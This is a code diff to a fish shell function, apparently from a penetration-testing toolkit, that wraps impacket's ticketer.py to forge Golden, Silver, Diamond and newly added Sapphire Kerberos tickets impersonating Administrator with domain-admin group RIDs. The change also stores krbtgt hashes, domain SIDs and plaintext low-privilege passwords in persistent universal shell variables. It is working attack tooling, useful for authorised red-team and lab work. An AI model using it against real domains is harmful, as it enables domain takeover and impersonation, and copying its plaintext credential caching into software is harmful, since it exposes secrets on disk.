@@ -1,8 +1,8 @@
-# description: Create Golden, Silver, and Diamond Tickets (Interactive & Flags)
-function __kronos_ticket --description "Create Golden, Silver, and Diamond Tickets using ticketer.py"
+# description: Create Golden, Silver, Diamond, and Sapphire Tickets (Interactive & Flags)
+function __kronos_ticket --description "Create Golden, Silver, Diamond, and Sapphire Tickets using ticketer.py"
     set -l subaction $argv[1]
     set -l wizard 0
-    if contains -- "$subaction" golden silver diamond
+    if contains -- "$subaction" golden silver diamond sapphire
         set wizard 1
         set -e argv[1]
     end
@@ -11,9 +11,9 @@ function __kronos_ticket --description "Create Golden, Silver, and Diamond Ticke
     or return 1
 
     if set -q _flag_help
-        echo "Usage: kronos ticket [golden|silver|diamond] [OPTIONS]"
+        echo "Usage: kronos ticket [golden|silver|diamond|sapphire] [OPTIONS]"
         echo ""
-        echo "Create Golden, Silver, or Diamond tickets using impacket's ticketer.py."
+        echo "Create Golden, Silver, Diamond, or Sapphire tickets using impacket's ticketer.py."
         echo "If a subcommand is specified without all required flags,"
         echo "an interactive wizard will guide you through the process."
         echo ""
@@ -21,14 +21,16 @@ function __kronos_ticket --description "Create Golden, Silver, and Diamond Ticke
         echo "  -u, --user USER      User to impersonate (default: Administrator)"
         echo "  -d, --domain DOMAIN  Target domain FQDN (falls back to \$TGT_DC_DOMAIN)"
         echo "  -S, --sid SID        Domain SID"
-        echo "  -H, --hash HASH      krbtgt hash (Golden/Diamond) or service hash (Silver)"
+        echo "  -H, --hash HASH      krbtgt hash (Golden/Diamond/Sapphire) or service hash (Silver)"
         echo ""
         echo "Silver Ticket Options:"
         echo "  -s, --spn SPN        Target SPN (e.g., cifs/dc.domain.com)"
         echo ""
-        echo "Diamond Ticket Options:"
+        echo "Diamond/Sapphire Ticket Options:"
         echo "  -A, --auth-user USER Low-priv user for authentication"
         echo "  -P, --auth-pass PASS Low-priv password for authentication"
+        echo ""
+        echo "Diamond Ticket ONLY Options:"
         echo "  -I, --user-id RID    User RID (default: 500 for Administrator)"
         echo "  -G, --groups RIDS    Comma-separated group RIDs (default: 512,513,518,519,520)"
         echo ""
@@ -50,49 +52,67 @@ function __kronos_ticket --description "Create Golden, Silver, and Diamond Ticke
     if test "$wizard" -eq 1
         set_color cyan; echo "[*] Starting $subaction ticket wizard..."; set_color normal
         
-        # 1. Hash (krbtgt for golden/diamond, service for silver)
+        # 1. Hash (krbtgt for golden/diamond/sapphire, service for silver)
         set -l hash_label "krbtgt NTLM Hash"
         if test "$subaction" = "silver"; set hash_label "Service NTLM Hash"; end
-        set -l def_hash "$TGT_CRED_PASSWORD"
+        
+        set -l def_hash "$__KRONOS_CACHE_HASH"
+        if test -z "$def_hash"; set def_hash "$TGT_CRED_PASSWORD"; end
         if test -n "$hash"; set def_hash "$hash"; end
         set hash (__kronos_ask "$hash_label" "$def_hash"); or return 1
+        set -U __KRONOS_CACHE_HASH "$hash"
 
         # 2. Domain SID
-        set -l def_sid ""
+        set -l def_sid "$__KRONOS_CACHE_SID"
         if test -n "$sid"; set def_sid "$sid"; end
         set sid (__kronos_ask "Domain SID" "$def_sid"); or return 1
+        set -U __KRONOS_CACHE_SID "$sid"
 
         # 3. Domain FQDN
-        set -l def_domain "$TGT_DC_DOMAIN"
+        set -l def_domain "$__KRONOS_CACHE_DOMAIN"
+        if test -z "$def_domain"; set def_domain "$TGT_DC_DOMAIN"; end
         if test -n "$domain"; set def_domain "$domain"; end
         set domain (__kronos_ask "Domain FQDN" "$def_domain"); or return 1
+        set -U __KRONOS_CACHE_DOMAIN "$domain"
 
         # 4. User to impersonate
-        set -l def_user "Administrator"
+        set -l def_user "$__KRONOS_CACHE_USER"
+        if test -z "$def_user"; set def_user "Administrator"; end
         if test -n "$user"; set def_user "$user"; end
         set user (__kronos_ask "User to impersonate" "$def_user"); or return 1
+        set -U __KRONOS_CACHE_USER "$user"
         
         # 5. Subaction specific prompts
         if test "$subaction" = "silver"
-            set -l def_spn ""
+            set -l def_spn "$__KRONOS_CACHE_SPN"
             if test -n "$spn"; set def_spn "$spn"; end
             set spn (__kronos_ask "Target SPN (e.g. cifs/dc01.dante.local)" "$def_spn"); or return 1
-        else if test "$subaction" = "diamond"
-            set -l def_auth_user "$TGT_CRED_USERNAME"
+            set -U __KRONOS_CACHE_SPN "$spn"
+        else if test "$subaction" = "diamond" -o "$subaction" = "sapphire"
+            set -l def_auth_user "$__KRONOS_CACHE_AUTH_USER"
+            if test -z "$def_auth_user"; set def_auth_user "$TGT_CRED_USERNAME"; end
             if test -n "$auth_user"; set def_auth_user "$auth_user"; end
             set auth_user (__kronos_ask "Authentication User (Low-priv)" "$def_auth_user"); or return 1
+            set -U __KRONOS_CACHE_AUTH_USER "$auth_user"
 
-            set -l def_auth_pass ""
+            set -l def_auth_pass "$__KRONOS_CACHE_AUTH_PASS"
             if test -n "$auth_pass"; set def_auth_pass "$auth_pass"; end
             set auth_pass (__kronos_ask "Authentication Password" "$def_auth_pass"); or return 1
+            set -U __KRONOS_CACHE_AUTH_PASS "$auth_pass"
 
-            set -l def_user_id "500"
-            if test -n "$user_id"; set def_user_id "$user_id"; end
-            set user_id (__kronos_ask "Target User RID" "$def_user_id"); or return 1
+            if test "$subaction" = "diamond"
+                set -l def_user_id "$__KRONOS_CACHE_USER_ID"
+                if test -z "$def_user_id"; set def_user_id "500"; end
+                if test -n "$user_id"; set def_user_id "$user_id"; end
+                set user_id (__kronos_ask "Target User RID" "$def_user_id"); or return 1
+                set -U __KRONOS_CACHE_USER_ID "$user_id"
 
-            set -l def_groups "512,513,518,519,520"
-            if test -n "$groups"; set def_groups "$groups"; end
-            set groups (__kronos_ask "Group RIDs (comma-separated)" "$def_groups"); or return 1
+                set -l def_groups "$__KRONOS_CACHE_GROUPS"
+                if test -z "$def_groups"; set def_groups "512,513,518,519,520"; end
+                if test -n "$groups"; set def_groups "$groups"; end
+                set groups (__kronos_ask "Group RIDs (comma-separated)" "$def_groups"); or return 1
+                set -U __KRONOS_CACHE_GROUPS "$groups"
+            end
         end
     else
         # Non-wizard fallbacks
@@ -114,9 +134,9 @@ function __kronos_ticket --description "Create Golden, Silver, and Diamond Ticke
         return 1
     end
     
-    if test "$subaction" = "diamond"
-        if test -z "$auth_user"; echo "error: auth-user is required for diamond tickets (-A)"; return 1; end
-        if test -z "$auth_pass"; echo "error: auth-pass is required for diamond tickets (-P)"; return 1; end
+    if test "$subaction" = "diamond" -o "$subaction" = "sapphire"
+        if test -z "$auth_user"; echo "error: auth-user is required (-A)"; return 1; end
+        if test -z "$auth_pass"; echo "error: auth-pass is required (-P)"; return 1; end
     end
 
     set -l impacket_cmd ""
@@ -138,6 +158,9 @@ function __kronos_ticket --description "Create Golden, Silver, and Diamond Ticke
         case diamond
             set -a ticket_args -request -user "$auth_user" -password "$auth_pass" -user-id "$user_id" -groups "$groups"
             echo "[*] Forging Diamond Ticket for $user via $impacket_cmd..."
+        case sapphire
+            set -a ticket_args -request -user "$auth_user" -password "$auth_pass" -impersonate "$user"
+            echo "[*] Forging Sapphire Ticket for $user via $impacket_cmd..."
         case golden '*'
             echo "[*] Forging Golden Ticket for $user via $impacket_cmd..."
     end
